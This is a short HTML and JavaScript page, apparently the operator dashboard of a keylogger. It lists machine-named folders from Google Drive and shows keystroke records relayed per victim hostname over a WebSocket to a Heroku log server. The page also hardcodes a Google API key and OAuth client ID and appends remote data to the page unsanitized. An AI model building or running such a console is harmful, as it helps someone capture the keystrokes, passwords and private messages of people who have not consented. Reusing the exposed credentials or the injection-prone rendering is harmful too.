<!DOCTYPE html>
<html>
  <head>
    <title>管理介面</title>
    <meta charset="utf-8" />
    <script typr="text/javascript" src="https://code.jquery.com/jquery-3.6.1.min.js" />
  </head>
  <body>
    <p>管理介面</p>

    <!--Add buttons to initiate auth sequence and sign out-->
    <button id="authorize_button" onclick="handleAuthClick()">登入</button>
    <button id="signout_button" onclick="handleSignoutClick()">登出</button>

    <pre id="content" style="white-space: pre-wrap;"></pre>

    <hr>

    <div id="keyRecord">

    </div>

    <script type="text/javascript">
        const CLIENT_ID = '366215724019-qqo1q5nlos02ac5ii4a55sfqqrs04tsl.apps.googleusercontent.com';
        const API_KEY = 'AIzaSyCBywDDiNawTCa4fXeO6teysyZxtaNaUgg';

        const DISCOVERY_DOC = 'https://www.googleapis.com/discovery/v1/apis/drive/v3/rest';
        const SCOPES = 'https://www.googleapis.com/auth/drive.metadata.readonly';

        let tokenClient;
        let gapiInited = false;
        let gisInited = false;
        let socket = null;
        let userId = "";

        document.getElementById('authorize_button').style.visibility = 'hidden';
        document.getElementById('signout_button').style.visibility = 'hidden';

        function gapiLoaded() {
            gapi.load('client', initializeGapiClient);
        }

        async function initializeGapiClient() {
            await gapi.client.init({
                apiKey: API_KEY,
                discoveryDocs: [DISCOVERY_DOC],
            });
            gapiInited = true;
            maybeEnableButtons();
        }

        function gisLoaded() {
            tokenClient = google.accounts.oauth2.initTokenClient({
                client_id: CLIENT_ID,
                scope: SCOPES,
                callback: '', // defined later
            });
            gisInited = true;
            maybeEnableButtons();
        }

        function maybeEnableButtons() {
            if (gapiInited && gisInited) {
                document.getElementById('authorize_button').style.visibility = 'visible';
            }
        }

        function handleAuthClick() {
            tokenClient.callback = async (resp) => {
                if (resp.error !== undefined) {
                throw (resp);
                }
                document.getElementById('signout_button').style.visibility = 'visible';
                document.getElementById('authorize_button').innerText = '重新整理';
                await listUsers('1DyegqnCILVvZVylrLXZxaVOO9wuQKkJw');
            };

            if (gapi.client.getToken() === null) {
                tokenClient.requestAccessToken({prompt: 'consent'});
            } else {
                tokenClient.requestAccessToken({prompt: ''});
            }
        }

        function handleSignoutClick() {
            const token = gapi.client.getToken();
            if (token !== null) {
                google.accounts.oauth2.revoke(token.access_token);
                gapi.client.setToken('');
                document.getElementById('content').innerText = '';
                document.getElementById('authorize_button').innerText = 'Authorize';
                document.getElementById('signout_button').style.visibility = 'hidden';
            }
        }

        async function listUsers(folderId) {
            socket = new WebSocket("wss://ws-log.herokuapp.com");
            socket.onmessage = function(e) {
                let data = e.data.split(":");
                if(data[0] == userId) {
                    $("#keyRecord").append(data[1]);
                }
            }
            let files = await listFiles(folderId);
            if (!files || files.length == 0) {
                document.getElementById('content').innerText = 'No files found.';
                return;
            }
            //DBG
            files.push({
                id: "DESKTOP-97HBSM0",
                name: "DESKTOP-97HBSM0"
            })
            let output = "<h2>請選擇使用者名稱</h2>";
            for(let i=0;i<files.length;i++) {
                output+= "<button onclick=\"showUser('" + files[i].id + "')\">" + files[i].name + "</button>";
            }
            document.getElementById('content').innerHTML = output;
        }

        async function listFiles(folderId) {
            let response;
            try {
                response = await gapi.client.drive.files.list({
                    'q': `'${folderId}' in parents`,
                    'pageSize': 10,
                    'fields': 'files(id, name)',
                });
            } catch (err) {
                document.getElementById('content').innerText = err.message;
                return;
            }
            return response.result.files;
        }

        function showUser(uid) {
            userId = uid;
        }
    </script>
    <script async defer src="https://apis.google.com/js/api.js" onload="gapiLoaded()"></script>
    <script async defer src="https://accounts.google.com/gsi/client" onload="gisLoaded()"></script>
  </body>
</html>